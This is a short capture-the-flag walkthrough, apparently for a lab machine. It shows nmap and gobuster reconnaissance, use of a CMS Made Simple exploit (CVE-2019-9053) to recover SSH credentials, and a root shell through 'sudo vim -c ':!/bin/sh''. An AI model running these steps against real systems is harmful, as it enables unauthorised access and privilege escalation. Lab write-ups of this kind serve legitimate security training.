first 
kali>nmap -sT -sV -p- $IP	//-sT for normal tcp scan ,-sV for service version scan ,-p- to scan all ports

there we found that there is website on port 80

doind dir buster on the website 
kali>gobuster -dir -u http://10.10.142.2237/ -w /usr/share/dirb/wordlists/common.txt

there we found a directory /simple/
 where we found CMS Made Simple is running and we also found its version so we found its CVE in internet where we 
found its CVE - CVE-2019-9053

now we will run this script against website
where we find username - mitch
password - secret for ssh

now we will login in through ssh
kali>ssh mitch@$IP -p 2222		//-p to sepicify port that is 2222 in our case

after login we will find user flag now privileg escalation
kali>sudo -l
we find we can run viw as root
so going in GTFObins and entering vim we find 

kali>sudo vim -c ':!/bin/sh'
will give root now get root flag

-----------------------------------------------
kali>nmap -sC -sV -Pn $IP


